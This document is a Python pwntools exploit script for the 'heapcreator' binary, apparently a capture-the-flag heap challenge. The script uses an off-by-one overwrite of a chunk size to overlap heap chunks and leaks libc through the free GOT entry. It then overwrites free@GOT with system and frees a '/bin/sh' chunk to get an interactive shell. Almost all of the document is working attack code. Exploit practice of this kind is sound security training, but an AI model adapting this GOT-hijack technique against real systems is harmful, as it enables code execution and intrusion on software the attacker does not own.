from pwn import *
context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 1

def debug_on():
	context.log_level = "debug"

g_fname = "./heapcreator"
g_elf = ELF(g_fname)
g_libcname = "/glibc/2.23/64/lib/libc-2.23.so" if LOCAL else "./libc-2.23.so"
ld_name = "/glibc/2.23/64/lib/ld-2.23.so"

if (LOCAL):
	g_io = process([ld_name, g_fname])
else:
	g_io = remote()

g_libc = ELF(g_libcname)

def getpid():
	if (DEBUG & LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def opt(idx):
	sla("Your choice :", str(idx))

def create(size, content):
	opt(1)
	sa("Size of Heap : ", str(size))
	sa("Content of heap:", content)

def edit(idx, content):
	opt(2)
	sa("Index :", str(idx))
	sa("Content of heap : ", content)

def show(idx):
	opt(3)
	sa("Index :", str(idx))

def delete(idx):
	opt(4)	
	sa("Index :", str(idx))

def pwn():
	create(0x18, "000") # 0
	create(0x18, "111") # 1
	create(0x18, "222") # 2

	getpid()
	# 1st. modify heaparray[0]'s chunk size and extend it to heaparray[1]'s
	edit(0, "/bin/sh".ljust(0x18, '\0') + '\x61')	

	# 2nd. delete heaparray[1]
	delete(1)
	
	# 3rd. add a new record
	payload = flat([
		'a'*0x10,
		0, 0x21, 'b'*0x18,
		0x21, 0x18, g_elf.got["free"]
	])
	create(0x50, payload) # reallocate to heaparray[1]

	# 4th. leak address free
	show(2)
	ru("Content : ")
	data = rl()
	log.info("received data=%s", data)
	addr_free = u64(data[:-1].ljust(8, b'\0'))
	libc_base = addr_free - g_libc.symbols["free"]
	addr_system = libc_base + g_libc.symbols["system"]
	log.success("free@%#x\nlibc@%#x\nsystem@%#x", addr_free, libc_base, addr_system)

	# 5th. hijack free@got to system's address by edit heaparray[2]
	edit(2, p64(addr_system))
	
	# 6th. trigger system() via invoke free
	delete(0)

if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive()

